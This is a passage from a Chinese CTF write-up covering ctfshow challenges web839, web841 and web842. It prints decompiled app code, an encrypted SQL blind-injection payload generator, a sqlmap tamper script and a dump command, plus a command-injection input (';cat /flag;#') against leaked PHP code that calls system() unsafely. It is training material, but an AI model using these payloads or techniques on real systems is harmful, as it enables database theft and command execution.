class-name">String</span> var2<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token comment">// 生成随机 UUID</span>            <span class="token class-name">String</span> var3 <span class="token operator">=</span> <span class="token constant">UUID</span><span class="token punctuation">.</span><span class="token function">randomUUID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 将用户名与生成的 UUID 进行加密</span>            <span class="token class-name">String</span> var4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token class-name">CryptoJS</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token class-name">StandardCharsets</span><span class="token punctuation">.</span><span class="token constant">UTF_8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Runtime</span> var7 <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">StringBuilder</span> var5 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 绑定参数进行登录</span>            var7<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>var5<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"curl -d 'username="</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"' -d 'password="</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"' -b 'uuid="</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"' -H 'User-Agent: ctfer_pro_app' "</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>authURL<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">StringBuilder</span> var8 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">LoggedInUser</span> var10 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LoggedInUser</span><span class="token punctuation">(</span>var3<span class="token punctuation">,</span> var8<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"用户 "</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">" 激活失败"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Result<span class="token punctuation">.</span>Success</span> var9 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Result<span class="token punctuation">.</span>Success</span><span class="token punctuation">(</span>var10<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> var9<span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var6<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Result<span class="token punctuation">.</span>Error</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">IOException</span><span class="token punctuation">(</span><span class="token string">"Error logging in, authURL 应替换为题目URL地址"</span><span class="token punctuation">,</span> var6<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获取加密方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ctfshow<span class="token punctuation">.</span>ctferpro<span class="token punctuation">.</span>util</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CryptoJS</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token class-name">CryptoJS</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">encode</span><span class="token punctuation">(</span><span class="token class-name">String</span> var0<span class="token punctuation">,</span> <span class="token class-name">String</span> var1<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> var4<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>var4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> var4 <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> var2<span class="token punctuation">[</span>var4<span class="token punctuation">]</span> <span class="token operator">=</span> var4<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">}</span>        <span class="token keyword">short</span> var10<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>var10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> var10 <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token operator">++</span>var10<span class="token punctuation">)</span> <span class="token punctuation">{</span>            var3<span class="token punctuation">[</span>var10<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span>var1<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>var10 <span class="token operator">%</span> var1<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">int</span> var5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> var6<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>var4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> var4 <span class="token operator">&lt;</span> <span class="token number">255</span><span class="token punctuation">;</span> <span class="token operator">++</span>var4<span class="token punctuation">)</span> <span class="token punctuation">{</span>            var5 <span class="token operator">=</span> <span class="token punctuation">(</span>var2<span class="token punctuation">[</span>var4<span class="token punctuation">]</span> <span class="token operator">+</span> var5 <span class="token operator">+</span> var3<span class="token punctuation">[</span>var4<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>            var6 <span class="token operator">=</span> var2<span class="token punctuation">[</span>var4<span class="token punctuation">]</span><span class="token punctuation">;</span>            var2<span class="token punctuation">[</span>var4<span class="token punctuation">]</span> <span class="token operator">=</span> var2<span class="token punctuation">[</span>var5<span class="token punctuation">]</span><span class="token punctuation">;</span>            var2<span class="token punctuation">[</span>var5<span class="token punctuation">]</span> <span class="token operator">=</span> var6<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        var5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        var6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var8 <span class="token operator">=</span> var0<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var9 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span>var8<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>var10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> var10 <span class="token operator">&lt;</span> var8<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>var10<span class="token punctuation">)</span> <span class="token punctuation">{</span>            var5 <span class="token operator">=</span> <span class="token punctuation">(</span>var5 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>            var6 <span class="token operator">=</span> <span class="token punctuation">(</span>var2<span class="token punctuation">[</span>var5<span class="token punctuation">]</span> <span class="token operator">+</span> var6<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> var7 <span class="token operator">=</span> var2<span class="token punctuation">[</span>var5<span class="token punctuation">]</span><span class="token punctuation">;</span>            var2<span class="token punctuation">[</span>var5<span class="token punctuation">]</span> <span class="token operator">=</span> var2<span class="token punctuation">[</span>var6<span class="token punctuation">]</span><span class="token punctuation">;</span>            var2<span class="token punctuation">[</span>var6<span class="token punctuation">]</span> <span class="token operator">=</span> var7<span class="token punctuation">;</span>            <span class="token keyword">char</span> var11 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span>var2<span class="token punctuation">[</span><span class="token punctuation">(</span>var2<span class="token punctuation">[</span>var5<span class="token punctuation">]</span> <span class="token operator">+</span> var2<span class="token punctuation">[</span>var6<span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            var9<span class="token punctuation">[</span>var10<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span>var8<span class="token punctuation">[</span>var10<span class="token punctuation">]</span> <span class="token operator">^</span> var11<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>var9<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>虽然经过反编译后有点难懂但不妨碍使用，在用户名处进行注入测试</p><p>生成 payload</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">encode</span><span class="token punctuation">(</span><span class="token class-name">String</span> var0<span class="token punctuation">,</span> <span class="token class-name">String</span> var1<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> var4<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>var4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> var4 <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> var2<span class="token punctuation">[</span>var4<span class="token punctuation">]</span> <span class="token operator">=</span> var4<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">}</span>        <span class="token keyword">short</span> var10<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>var10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> var10 <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token operator">++</span>var10<span class="token punctuation">)</span> <span class="token punctuation">{</span>            var3<span class="token punctuation">[</span>var10<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span> var1<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>var10 <span class="token operator">%</span> var1<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">int</span> var5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> var6<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>var4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> var4 <span class="token operator">&lt;</span> <span class="token number">255</span><span class="token punctuation">;</span> <span class="token operator">++</span>var4<span class="token punctuation">)</span> <span class="token punctuation">{</span>            var5 <span class="token operator">=</span> <span class="token punctuation">(</span>var2<span class="token punctuation">[</span>var4<span class="token punctuation">]</span> <span class="token operator">+</span> var5 <span class="token operator">+</span> var3<span class="token punctuation">[</span>var4<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>            var6 <span class="token operator">=</span> var2<span class="token punctuation">[</span>var4<span class="token punctuation">]</span><span class="token punctuation">;</span>            var2<span class="token punctuation">[</span>var4<span class="token punctuation">]</span> <span class="token operator">=</span> var2<span class="token punctuation">[</span>var5<span class="token punctuation">]</span><span class="token punctuation">;</span>            var2<span class="token punctuation">[</span>var5<span class="token punctuation">]</span> <span class="token operator">=</span> var6<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        var5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        var6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var8 <span class="token operator">=</span> var0<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var9 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span>var8<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>var10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> var10 <span class="token operator">&lt;</span> var8<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>var10<span class="token punctuation">)</span> <span class="token punctuation">{</span>            var5 <span class="token operator">=</span> <span class="token punctuation">(</span>var5 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>            var6 <span class="token operator">=</span> <span class="token punctuation">(</span>var2<span class="token punctuation">[</span>var5<span class="token punctuation">]</span> <span class="token operator">+</span> var6<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> var7 <span class="token operator">=</span> var2<span class="token punctuation">[</span>var5<span class="token punctuation">]</span><span class="token punctuation">;</span>            var2<span class="token punctuation">[</span>var5<span class="token punctuation">]</span> <span class="token operator">=</span> var2<span class="token punctuation">[</span>var6<span class="token punctuation">]</span><span class="token punctuation">;</span>            var2<span class="token punctuation">[</span>var6<span class="token punctuation">]</span> <span class="token operator">=</span> var7<span class="token punctuation">;</span>            <span class="token keyword">char</span> var11 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> var2<span class="token punctuation">[</span><span class="token punctuation">(</span>var2<span class="token punctuation">[</span>var5<span class="token punctuation">]</span> <span class="token operator">+</span> var2<span class="token punctuation">[</span>var6<span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            var9<span class="token punctuation">[</span>var10<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>var8<span class="token punctuation">[</span>var10<span class="token punctuation">]</span> <span class="token operator">^</span> var11<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>var9<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token string">"1' or sleep(3);#"</span><span class="token punctuation">,</span> <span class="token string">"123456"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿着生成的填到用户名发包，实现了延迟三秒，存在 SQL 盲注</p><p><img src="/../../../pic/image-20230124153209828.png"></p><p>写个加密的 tamper 丢到 sqlmap 跑</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token keyword">import</span> base64<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOWEST<span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> <span class="token string">"123456"</span>    iS <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    iK <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        iS<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        iK<span class="token punctuation">.</span>append<span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    j <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> iS<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>iK<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        temp <span class="token operator">=</span> iS<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        iS<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> iS<span class="token punctuation">[</span>j<span class="token punctuation">]</span>        iS<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> temp    i <span class="token operator">=</span> <span class="token number">0</span>    j <span class="token operator">=</span> <span class="token number">0</span>    new_payload <span class="token operator">=</span> <span class="token string">""</span>    iOutputChar <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> iS<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        temp <span class="token operator">=</span> iS<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        iS<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> iS<span class="token punctuation">[</span>j<span class="token punctuation">]</span>        iS<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> temp        t <span class="token operator">=</span> iS<span class="token punctuation">[</span><span class="token punctuation">(</span>iS<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> iS<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">]</span>        iOutputChar <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>payload<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> t<span class="token punctuation">)</span>    <span class="token keyword">return</span> iOutputChar<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    CTFSHOW web839    """</span>    <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>encode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">if</span> payload <span class="token keyword">else</span> payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行 sqlmap</p><pre class="line-numbers language-none"><code class="language-none">python3 sqlmap.py --url "http://c89fe375-b81f-447f-9133-f85a4f9048c9.challenge.ctf.show/app/auth" --method "POST" --cookie "uuid=123456" --data "username=*&amp;password=password" --header "User-Agent: ctfer_pro_app" --tamper "web839" --batch --dbms "mysql" -D "app" -T "app_f1ag" -C "f1ag" --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../pic/image-20230124174805127.png"></p><h2 id="9-web841"><a href="#9-web841" class="headerlink" title="9. web841"></a>9. web841</h2><p>进行 SSH 爆破</p><p><img src="/../../../pic/image-20230124175247689.png"></p><h2 id="10-web842"><a href="#10-web842" class="headerlink" title="10. web842"></a>10. web842</h2><ul><li>题目描述</li></ul><p>泄露的东西往往是不经意间的 </p><ul><li>题目解析</li></ul><p>查看源代码无果，扫描一下目录</p><p><img src="/../../../pic/image-20230124180145067.png"></p><p>存在 git 泄露，使用 git_extract 下载下来</p><p>获得 index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo <span class="token interpolation"><span class="token variable">$code</span></span>|base64"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接进行命令执行</p><pre class="line-numbers language-none"><code class="language-none">[POST]code=;cat /flag;#<span 